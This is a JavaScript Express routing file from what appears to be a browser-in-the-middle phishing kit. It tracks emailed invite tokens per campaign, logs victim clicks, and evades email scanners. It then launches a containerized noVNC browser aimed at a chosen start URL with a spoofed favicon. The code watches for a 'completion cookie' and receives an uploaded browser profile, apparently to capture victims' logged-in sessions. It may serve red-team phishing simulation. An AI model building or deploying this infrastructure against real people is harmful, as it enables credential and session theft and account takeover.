'use strict';
const express = require('express');
const { getDb } = require('../models/init-db');
const { spawnContainer } = require('../services/docker');
const { signSessionToken } = require('../services/jwt');
const { joinLimiter } = require('../middleware/rateLimiter');
const { v4: uuidv4 } = require('uuid');

const router = express.Router();

// Configurable join path — set JOIN_PATH=s (or any slug) in .env to change /join → /s
const JOIN_PATH = process.env.JOIN_PATH || 'join';

// Returns { siteKey, secretKey } from env (preferred) or DB settings
function getTurnstileKeys() {
  const envSite   = process.env.TURNSTILE_SITE_KEY;
  const envSecret = process.env.TURNSTILE_SECRET_KEY;
  if (envSite || envSecret) return { siteKey: envSite || null, secretKey: envSecret || null };

  const db = getDb();
  const rows = db.prepare(
    "SELECT key, value FROM settings WHERE key IN ('TURNSTILE_SITE_KEY','TURNSTILE_SECRET_KEY')"
  ).all();
  db.close();
  const map = Object.fromEntries(rows.map(r => [r.key, r.value]));
  return { siteKey: map.TURNSTILE_SITE_KEY || null, secretKey: map.TURNSTILE_SECRET_KEY || null };
}

async function verifyTurnstile(cfToken, ip, secretKey) {
  const resp = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ secret: secretKey, response: cfToken, remoteip: ip }),
  });
  const data = await resp.json();
  return data.success === true;
}

// Validates token row — renders error and returns null if invalid
function getTokenRow(db, token, res) {
  const row = db.prepare(`
    SELECT it.*, c.expires_at, c.lifetime_minutes, c.redirect_url,
           c.start_url, c.favicon_url, c.completion_url, c.completion_cookie,
           c.show_loading_page, c.slug, c.after_completion, c.id as campaign_id, c.name as campaign_name
    FROM invite_tokens it
    JOIN campaigns c ON c.id = it.campaign_id
    WHERE it.token = ?
  `).get(token);

  if (!row) {
    res.status(404).render('error', { title: 'Invalid Link', message: 'This invite link is not valid.' });
    return null;
  }
  if (new Date(row.expires_at) < new Date()) {
    res.status(410).render('error', { title: 'Link Expired', message: 'This invite link has expired.' });
    return null;
  }
  if (row.completed) {
    res.status(410).render('error', { title: 'Session Ended', message: 'This session has already ended.' });
    return null;
  }
  return row;
}

// ── GET /:joinPath/:token ─────────────────────────────────────────────────────
//
// Shows a landing page. Does NOT spawn a container — safe for email scanners/bots.
// If an active session already exists for this token, goes straight to loading.
router.get(`/${JOIN_PATH}/:token`, joinLimiter, async (req, res, next) => {
  const db = getDb();
  try {
    const row = getTokenRow(db, req.params.token, res);
    if (!row) return db.close();

    // Record first click (idempotent on the token columns).
    if (!row.clicked_at) {
      db.prepare("UPDATE invite_tokens SET clicked_at = datetime('now'), clicked_ip = ? WHERE id = ?")
        .run(req.ip || req.connection.remoteAddress, row.id);
    }

    // Log every click as an event (including repeat hits and scanner bots).
    // Only tokens that originated from an email send are worth tracking.
    if (row.email) {
      try {
        const send = db.prepare(
          'SELECT id FROM email_sends WHERE invite_token_id = ? ORDER BY sent_at DESC LIMIT 1'
        ).get(row.id);
        db.prepare(`
          INSERT INTO email_events (email_send_id, invite_token_id, event_type, ip, user_agent)
          VALUES (?, ?, 'click', ?, ?)
        `).run(send ? send.id : null, row.id,
               req.ip || null, req.get('user-agent') || null);
      } catch (_) {}
    }

    // If a container was already launched, check if it's still active
    if (row.launched) {
      const session = db.prepare(
        'SELECT session_id, vnc_password FROM sessions WHERE invite_token_id = ? AND completed_at IS NULL'
      ).get(row.id);
      db.close();

      if (session) {
        const base      = `${req.protocol}://${req.get('host')}`;
        const sid       = session.session_id;
        const shortId   = sid.split('-').pop();
        const viewerUrl = row.slug ? `${base}/${row.slug}/${shortId}` : `${base}/vnc/${sid}/vnc.html?autoconnect=1&resize=remote&path=${encodeURIComponent('/vnc/' + sid + '/websockify')}${session.vnc_password ? '&password=' + encodeURIComponent(session.vnc_password) : ''}`;
        return res.render('loading', {
          title:    row.campaign_name || 'Loading…',
          readyUrl:  `${base}/vnc/${sid}/ready`,
          viewerUrl,
          hidden:   row.show_loading_page === 0,
        });
      }
      // Session was completed — fall through to show join page again
    } else {
      db.close();
    }

    const { siteKey } = getTurnstileKeys();
    if (siteKey) {
      res.render('join', {
        title: 'Join Session', joinPath: JOIN_PATH,
        token: req.params.token, turnstileSiteKey: siteKey,
      });
    } else {
      res.render('join-auto', { joinPath: JOIN_PATH, token: req.params.token });
    }
  } catch (err) {
    try { db.close(); } catch (_) {}
    next(err);
  }
});

// ── POST /:joinPath/:token ────────────────────────────────────────────────────
//
// Verifies turnstile (if configured), spawns container, shows loading page.
router.post(`/${JOIN_PATH}/:token`, joinLimiter, async (req, res, next) => {
  const db = getDb();
  try {
    const row = getTokenRow(db, req.params.token, res);
    if (!row) return db.close();

    // If already launched with an active session, redirect there
    if (row.launched) {
      const session = db.prepare(
        'SELECT session_id, vnc_password FROM sessions WHERE invite_token_id = ? AND completed_at IS NULL'
      ).get(row.id);
      if (session) {
        db.close();
        const base      = `${req.protocol}://${req.get('host')}`;
        const sid       = session.session_id;
        const shortId   = sid.split('-').pop();
        const viewerUrl = row.slug ? `${base}/${row.slug}/${shortId}` : `${base}/vnc/${sid}/vnc.html?autoconnect=1&resize=remote&path=${encodeURIComponent('/vnc/' + sid + '/websockify')}${session.vnc_password ? '&password=' + encodeURIComponent(session.vnc_password) : ''}`;
        return res.render('loading', {
          title:    row.campaign_name || 'Loading…',
          readyUrl:  `${base}/vnc/${sid}/ready`,
          viewerUrl,
          hidden:   row.show_loading_page === 0,
        });
      }
    }

    // Verify Cloudflare Turnstile if a secret key is configured
    const { secretKey } = getTurnstileKeys();
    if (secretKey) {
      const cfToken = req.body['cf-turnstile-response'];
      if (!cfToken) {
        db.close();
        return res.status(400).render('error', {
          title: 'Verification Required', message: 'Please complete the security check.',
        });
      }
      const passed = await verifyTurnstile(cfToken, req.ip, secretKey);
      if (!passed) {
        db.close();
        return res.status(403).render('error', {
          title: 'Verification Failed', message: 'Security check failed. Please go back and try again.',
        });
      }
    }

    const sessionId    = uuidv4();
    const sessionToken = signSessionToken({
      sessionId, containerId: 'pending', lifetimeMinutes: row.lifetime_minutes,
    });

    const controlHost = process.env.CONTAINER_HOST || process.env.CONTROL_HOST || `http://localhost:${process.env.PORT || 3000}`;
    const { containerId, novncPort, vncPassword } = await spawnContainer({
      sessionId,
      sessionToken,
      submitUrl:      `${controlHost}/session/${sessionId}/submit`,
      completeUrl:    `${controlHost}/session/${sessionId}/complete`,
      infoUrl:        `${controlHost}/vnc/${sessionId}/info`,
      uploadUrl:      `${controlHost}/session/${sessionId}/profile`,
      completionUrl:    row.completion_url || '',
      completionCookie: row.completion_cookie || '',
      startUrl:         row.start_url,
      faviconUrl:     row.favicon_url || '',
      redirectUrl:    row.redirect_url,
      lifetimeMinutes: row.lifetime_minutes,
    });

    db.prepare(`
      INSERT INTO sessions
        (session_id, invite_token_id, container_id, container_port, vnc_password, launched_at)
      VALUES (?, ?, ?, ?, ?, datetime('now'))
    `).run(sessionId, row.id, containerId, novncPort, vncPassword);

    db.prepare('UPDATE invite_tokens SET launched = 1 WHERE id = ?').run(row.id);
    db.close();

    const base      = `${req.protocol}://${req.get('host')}`;
    const shortId   = sessionId.split('-').pop();
    const viewerUrl = row.slug ? `${base}/${row.slug}/${shortId}` : `${base}/vnc/${sessionId}/vnc.html?autoconnect=1&resize=remote&path=${encodeURIComponent('/vnc/' + sessionId + '/websockify')}${vncPassword ? '&password=' + encodeURIComponent(vncPassword) : ''}`;

    res.render('loading', {
      title:    row.campaign_name || 'Loading…',
      readyUrl:  `${base}/vnc/${sessionId}/ready`,
      viewerUrl,
      hidden:   row.show_loading_page === 0,
    });
  } catch (err) {
    try { db.close(); } catch (_) {}
    next(err);
  }
});

module.exports = router;
